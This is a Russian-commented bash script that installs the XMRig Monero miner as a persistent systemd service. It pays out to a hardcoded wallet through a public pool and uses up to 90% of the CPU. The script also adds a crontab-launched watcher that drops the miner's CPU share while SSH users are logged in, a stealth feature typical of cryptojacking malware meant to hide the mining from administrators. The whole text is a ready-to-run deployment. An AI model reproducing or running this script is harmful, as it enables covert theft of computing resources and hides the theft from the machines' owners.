#!/bin/bash

# Задаем переменные
XMRIG_VERSION="6.15.0"
XMRIG_DIR="/usr/local/xmrig"
XMRIG_BIN="$XMRIG_DIR/xmrig"
POOL="pool.supportxmr.com:3333"
WALLET="467i7PYq63KSkgCq8TyuWpRyruY8fipyu9hnBgvCPCMXhLmT1Nepb3p2grsi12aHEg9Fosn4YypzdH3LMFZ1EjQWS8MtkPJ"
CONTROL_SCRIPT="/usr/local/bin/xmrig_control.sh"
CONFIG_FILE="/etc/xmrig/config.json"
NUM_WORKERS=8

# Определение количества ядер
NUM_CORES=$(nproc)

# Создание директории для XMRig
sudo mkdir -p $XMRIG_DIR

# Загрузка и распаковка XMRig
wget https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz -O /tmp/xmrig.tar.gz
tar -xzf /tmp/xmrig.tar.gz -C /tmp
sudo mv /tmp/xmrig-$XMRIG_VERSION/xmrig $XMRIG_BIN
sudo chmod +x $XMRIG_BIN

# Создание конфигурационного файла для XMRig
echo "Создание конфигурационного файла для XMRig..."
sudo mkdir -p /etc/xmrig
cat <<EOF | sudo tee $CONFIG_FILE
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "threads": $NUM_CORES
  },
  "pools": [
    $(for i in $(seq 1 $NUM_WORKERS); do
        echo -n "{
          \"url\": \"$POOL\",
          \"user\": \"$WALLET.worker$i\",
          \"pass\": \"x\",
          \"coin\": \"monero\"
        }"
        [[ $i -lt $NUM_WORKERS ]] && echo -n ","
      done)
  ],
  "api": {
    "enabled": false,
    "port": 0
  }
}
EOF

# Создание системного сервиса для XMRig
echo "[Unit]
Description=XMRig Miner
After=network.target

[Service]
ExecStart=$XMRIG_BIN --config $CONFIG_FILE
Nice=10
CPUQuota=90%

[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/xmrig.service

# Перезагрузка системного менеджера для распознавания нового сервиса
sudo systemctl daemon-reload

# Включение и запуск XMRig
sudo systemctl enable xmrig
sudo systemctl start xmrig

# Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
echo "#!/bin/bash

# Функция для обновления CPUQuota в зависимости от количества SSH-подключений
update_cpu_quota() {
    ssh_connections=\$(who | grep -c \"ssh\")
    if [ \$ssh_connections -gt 0 ]; then
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=30%
    else
        sudo systemctl set-property --runtime -- xmrig.service CPUQuota=90%
    fi
}

# Бесконечный цикл для проверки каждые 60 секунд
while true; do
    update_cpu_quota
    sleep 60
done" | sudo tee $CONTROL_SCRIPT

# Делаем скрипт исполняемым
sudo chmod +x $CONTROL_SCRIPT

# Добавление скрипта в автозагрузку через crontab
(crontab -l 2>/dev/null; echo "@reboot $CONTROL_SCRIPT") | crontab -

# Запуск скрипта управления XMRig
$CONTROL_SCRIPT &
